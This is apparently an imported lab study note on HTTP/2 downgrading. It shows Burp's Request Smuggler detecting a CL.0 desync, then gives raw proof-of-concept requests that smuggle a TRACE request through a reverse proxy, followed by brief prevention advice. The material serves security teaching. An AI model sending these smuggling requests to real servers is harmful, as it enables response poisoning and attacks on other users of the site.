---
technique: "Tools & Prevention"
family: "http-protocol"
severity_hint: "medium"
tags: []
source: "_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/Tools & Prevention.md"
source_sha256: "582e6902aad60be3912c183abd777a47ed9137bc393953dec84ae96e2eabf95e"
curator_version: 2
review_status: imported-unreviewed
---

# Tools & Prevention

> Family: **http-protocol** · Severity hint: **medium** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: —.

## Quick index — payloads & commands in this note
- `python: GET /index.php?param1=HelloWorld HTTP/2`
- `Queueing reuest scan: CL.0`
- `POST /index.php HTTP/1.1`
- `GET /index.php HTTP/2`

## Playbook (operator notes)

# Tools & Prevention

**Tools of the Trade**

- Request Smuggler (Burp)

```python
GET /index.php?param1=HelloWorld HTTP/2
Host: http2.htb
```

This will open a new window that is most likely too large for your 
screen. Just leave everything in the default settings and press `Enter` to start the scan. Burp will then run a scan for a `CL.0` vulnerability in the background. This is the same as the type of `H2.CL` vulnerability discussed in the previous section. It is also called `CL.0` vulnerability since the CL header is set to 0 and the request body contains only the smuggled request.

We can see the result of the scan in `Extensions > Installed`. When selecting the `HTTP Request Smuggler` extension from the list, select the `Output` Tab at the bottom of the window. The result is printed to the UI and looks like this:

```
Queueing reuest scan: CL.0
Found issue: CL.0 desync: h2CL|TRACE /
Target: https://172.17.0.2
HTTP Request Smuggler repeatedly issued the attached request. After 1 attempts, it got a response that appears to have been poisoned by the body of the previous request. For further details and information on remediation, please refer to https://portswigger.net/research/browser-powered-desync-attacks
Evidence:
======================================
GET /index.php HTTP/2
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com

======================================
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
======================================
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
======================================
```

Burp tells us that the web application is vulnerable to a `CL.0` vulnerability. It gives us a proof-of-concept request to verify the finding from the automated scan. Let's verify the result. To do so, we are going to use the following requests from the above output. Request 1:

```
POST /index.php HTTP/1.1
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

TRACE / HTTP/1.1
X-YzBqv:
```

```
GET /index.php HTTP/2
Host: 172.17.0.2:8443
Origin: https://wguglsurkz2.com
```

Ensure that the `Update Content-Length` option is unchecked

However, the second response is a `405` status code:

This indicates that we successfully smuggled the `TRACE` request past the reverse proxy and influenced the second request, proving a request smuggling vulnerability with the help of the burp extension `HTTP Request Smuggler`.

---

## HTTP/2 Attacks Prevention

The main cause for the attacks described here is HTTP/2 downgrading. 
Reverse proxies should not rewrite HTTP/2 requests to HTTP/1.1. Instead,
 HTTP/2 should be implemented end-to-end such that no rewriting is 
required. The difference in the two protocol versions means that minor 
deviations from the specifications in the implementation of reverse 
proxy and web server software can cause vulnerabilities such as request 
smuggling. Proper configuration and implementation of HTTP/2 prevent 
these issues entirely.

## Source
Original note: `_raw/Web attacks/Web Attacks/HTTP Attacks/HTTP 2 Downgrading/Tools & Prevention.md`
